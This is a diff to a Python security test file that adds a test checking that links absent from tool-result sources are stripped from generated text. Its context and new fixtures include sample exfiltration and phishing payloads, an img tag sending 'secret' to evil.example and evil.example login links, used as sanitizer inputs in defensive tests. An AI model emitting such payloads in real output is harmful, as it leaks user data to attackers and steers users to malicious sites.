@@ -6,7 +6,7 @@ from starlette.testclient import TestClient
 
 from app import db, tools
 from app.models import check_countries, check_indicator
-from app.security import OriginCheckMiddleware, clean_text, sanitize_html
+from app.security import OriginCheckMiddleware, clean_text, sanitize_html, strip_unsourced_links
 
 
 # ---------- XSS ----------
@@ -23,6 +23,15 @@ def test_sanitizer_removes_script_vectors(payload):
 
 def test_sanitizer_blocks_images_used_for_data_exfiltration():
     assert "<img" not in sanitize_html('<p><img src="https://evil.example/?q=secret"></p>')
+
+
+def test_links_not_from_tool_results_are_removed():
+    sources = '{"url": "https://data.worldbank.org/indicator/NY.GDP.PCAP.CD"}'
+    text = ("Defined here [1](https://data.worldbank.org/indicator/NY.GDP.PCAP.CD). "
+            "Read [this](https://evil.example/login) or https://evil.example/x.")
+    assert strip_unsourced_links(text, sources) == (
+        "Defined here [1](https://data.worldbank.org/indicator/NY.GDP.PCAP.CD). Read this or (link removed).")
+    assert strip_unsourced_links("[📈 Open chart](/chart/C-1)", "") == "[📈 Open chart](/chart/C-1)"
 
 
 def test_sanitizer_keeps_safe_formatting_and_https_links():
